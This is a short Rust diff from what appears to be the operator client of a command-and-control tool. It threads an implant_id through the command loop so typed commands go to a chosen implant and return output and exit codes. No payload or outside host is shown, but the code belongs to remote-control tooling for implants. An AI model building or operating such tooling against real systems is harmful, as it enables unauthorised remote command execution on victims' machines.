@@ -75,7 +75,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         if let Ok(index) = input.parse::<usize>()
             && let Some(implant) = implants.get(index - 1)
         {
-            enter_command_loop(implant);
+            enter_command_loop(index - 1, implant);
         }
     }
 
@@ -87,7 +87,7 @@ fn connect() -> TcpStream {
     TcpStream::connect(address.into_string().unwrap()).unwrap()
 }
 
-fn enter_command_loop(implant: &Implant) {
+fn enter_command_loop(implant_id: usize, implant: &Implant) {
     let mut last_exit_code = None;
     let mut last_output = None;
     loop {
@@ -120,6 +120,7 @@ fn enter_command_loop(implant: &Implant) {
         connection
             .write(
                 encode(Packet::CommandPacket {
+                    implant_id,
                     command: input.to_string(),
                 })
                 .unwrap()
@@ -130,7 +131,7 @@ fn enter_command_loop(implant: &Implant) {
         let packet = read_packet(&mut connection).unwrap();
 
         match packet {
-            Packet::CommandResult { output, exit_code } => {
+            Packet::CommandResult { exit_code, output } => {
                 last_exit_code = Some(exit_code);
                 last_output = Some(output);
             }
